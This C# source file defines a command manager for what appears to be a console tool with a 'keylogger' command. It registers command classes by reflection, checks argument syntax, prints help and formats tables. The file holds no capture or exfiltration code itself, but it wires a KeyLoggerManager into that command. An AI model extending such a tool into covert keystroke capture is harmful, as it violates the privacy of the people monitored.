using System;
using System.Collections.Generic;
using System.Linq;
using KeyLogger;
using Shared;

namespace Commands
{
    public static class CommandsManager
    {
        /// <summary>
        /// List of all Command classes
        /// </summary>
        public static List<ICommand> commandList;


        /// <summary>
        /// Constructor, fill commandList with the classes implementing the ICommand interface
        /// </summary>
        static CommandsManager()
        {
            var type = typeof(ICommand);

            commandList = AppDomain.CurrentDomain.GetAssemblies()
                .SelectMany(a => a.GetTypes())
                .Where(t => type.IsAssignableFrom(t) && !t.IsInterface)
                .Select(t => (ICommand)Activator.CreateInstance(t))
                .ToList();
        }


        /// <summary>   
        /// Return the Command whose name was given as a parameter, or null if it doesn't exist
        /// </summary>
        /// <param name="commandName">Command name to find</param>
        /// <returns>Found ICommand or null</returns>
        public static ICommand GetCommandByName(string commandName) => SearchCommand(s => s.name == commandName);


        /// <summary>
        /// Search a command in the commandList matching the given predicate
        /// </summary>
        /// <param name="predicate">Predicate to use to find the command</param>
        /// <returns>Found ICommand or null</returns>
        static ICommand SearchCommand(Func<ICommand, bool> predicate)
        {
            ICommand foundCommand;
            try
            {
                foundCommand = commandList.First(predicate);
            }
            catch (Exception)
            {
                foundCommand = null;
            }

            return foundCommand;
        }


        /// <summary>
        /// Check if the given arguments match match at least one validArguments combinaison of the given Command class
        /// </summary>
        /// <param name="command">Invoked Command</param>
        /// <param name="arguments">Passed arguments</param>
        /// <returns>Correct syntax boolean</returns>
        public static bool CheckCommandSyntax(ICommand command, List<string> arguments)
        {
            if (command.validArguments == null && arguments.Count == 0)
            {
                return true;
            }

            int dummy;  // Only for use of int.TryParse()
            var argsType = arguments.Select(s => int.TryParse(s, out dummy) ? typeof(int) : typeof(string)).ToList();

            return command.validArguments.Count(a => a.SequenceEqual(argsType)) != 0;
        }


        /// <summary>
        /// Display an help message for the given Command on the client console,
        /// the help message is composed of the Command's description and its syntaxHelper
        /// </summary>
        /// <param name="command">Command to show the help for</param>
        public static void ShowCommandHelp(ICommand command) => ColorTools.WriteMessage($"{command.description}\n---------------\nSyntax : {command.syntaxHelper}");
        // todo : re-style

        /// <summary>
        /// Display an help message for all the Commands on the client console, calls ShowCommandHelp
        /// </summary>
        public static void ShowGlobalHelp()
        {
            ColorTools.WriteMessage("--- Global help ---");
            foreach (var command in commandList)
            {
                Console.WriteLine("");
                ShowCommandHelp(command);
            }
        }


        /// <summary>
        /// Find the ICommand keylogger in the commandList and give it the KeyLoggerManager instance
        /// This method should only be called by the MainWindow
        /// </summary>
        /// <param name="manager">KeyLoggerManager instance</param>
        public static void PassKeyloggerManagerInstance(KeyLoggerManager manager)
        {
            var keyloggerCommandInstance = (KeyLogger)commandList.Find(x => x.name == "keylogger");
            keyloggerCommandInstance.GetKeyLoggerManagerInstance(manager);
        }


        /// <summary>
        /// Produce a string displaying a table from a list of Tuple(string, string)
        /// </summary>
        /// <param name="data">List of tuple to process</param>
        /// <returns>Table as a string</returns>
        internal static string TableDisplay(IReadOnlyCollection<Tuple<string, string>> data)
        {
            var result = "";
            var longestPrefix = data.Select(t => t.Item1.Length).Max();
            var longestValue = data.Select(t => t.Item2.Length).Max();
            var horizontalDelimiter = $"+{new string('-', longestPrefix + 2)}+{new string('-', longestValue + 2)}+";

            result += horizontalDelimiter + "\n";
            foreach (var tuple in data)
            {
                var spaces = new string(' ', longestPrefix - tuple.Item1.Length);
                result += $"| {tuple.Item1}{spaces} |";

                spaces = new string(' ', longestValue - tuple.Item2.Length);
                result += $" {tuple.Item2}{spaces} |\n";
            }
            result += horizontalDelimiter;

            return result;
        }

        
        // TODO edit checksyntax to use below implementation
        static bool CheckSyntax(string[] syntax, string[] toCheck)
        {
            var result = syntax.Length == toCheck.Length;

            for (var i = 0; i < syntax.Length && result; i++)
            {
                if (syntax[i] == "?") continue;

                if (syntax[i] == "0")
                {
                    if (!int.TryParse(toCheck[i], out int dummy))
                    {
                        result = false;
                        break;
                    }
                }
                else if (syntax[i] != toCheck[i])
                {
                    result = false;
                    break;
                }
            }

            return result;
        }


        public static List<string> GetSplittedCommand(string commandString)
        {
            return commandString.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries).ToList();
            // TODO : edit to take into account " "
        }
    }
}
